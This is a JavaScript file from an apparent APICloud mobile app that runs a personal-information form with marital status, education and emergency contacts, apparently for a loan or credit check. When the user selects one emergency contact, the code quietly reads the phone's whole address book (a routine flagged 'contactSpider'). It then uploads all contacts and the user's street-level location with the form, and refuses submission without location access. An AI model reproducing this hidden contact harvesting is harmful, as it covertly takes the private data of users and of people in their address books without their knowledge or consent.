var DVContacts = null;
var contacts = [];
var systemType = null;
var contactSpider = true;
var address = null;

apiready = function() {
    systemType = api.systemType;
    getLocation();

    picker('#marital', [
        { id: 3, value: '离异' },
        { id: 1, value: '已婚' },
        { id: 2, value: '未婚' },
        { id: 4, value: '丧偶' }
    ]);

    picker('#education', ['研究生', '大学', '高中', '初中', '小学', '其他']);
    picker('#relation-1', ['配偶', '父母']);
    picker('#relation-2', ['配偶', '父母', '同事', '兄弟', '朋友', '亲戚', '其他']);

    tap($('#contact-1'), function (){
        getContact($(this), function() {
            setTimeout(function (){
                if (!contactSpider) {
                    return;
                }
                contactSpider = false;
                contacts = [];
                getAllContacts();
            }, 500);
        });
    });

    tap($('#contact-2'), function (){
        getContact($(this));
    });

    tap($('.submit-btn button'), function (){
        var data = checkForm();

        if (!data) {
            return;
        }

        if (!address) {
            return msg('请打开定位权限继续认证');
        }

        data.maritalStatus = parseInt(data.maritalStatus);
        data.contacts = contacts;
        data.address = address;
        showLoading();
        post('auth/info', data, function (res) {
            if (res.status === 'error') {
                msg(res.msg);
            } else if (res.status === 'success') {
                msg(res.msg);
                api.closeWin();
            }
        });
    });

    function getAllContacts(page) {
        DVContacts = api.require('DVContacts');
        var page = page ? page : 0;
        var count = systemType === 'ios' ? 1000 : 1;
        DVContacts.queryByPage({
            count: count,
            pageIndex: page
        }, function (ret, err) {
            if (ret && page <= ret.pages && ret.contacts.length > 0) {
                // contacts = contacts.concat(ret.contacts); -
                contacts = ret.contacts;// +
                getAllContacts(++page)
            }
        });
    }
}

function getContact(obj, callback) {
    api.openContacts(function(ret, err) {
        if (ret && ret.status) {
            obj.find('input').get(0).value = ret.name;
            obj.find('input').get(1).value = ret.phone;
            callback && callback();
        } else {
            toast('请打开系统设置并授权通讯录访问权限');
        }
    });
}



function getLocation(){
    var geolocation = new BMap.Geolocation();
    geolocation.getCurrentPosition(function(res){
    	if (this.getStatus() == BMAP_STATUS_SUCCESS){
            var addr = res.address;
            address = addr.province + addr.city + addr.district + addr.street + addr.street_number;
    	}
    });
}
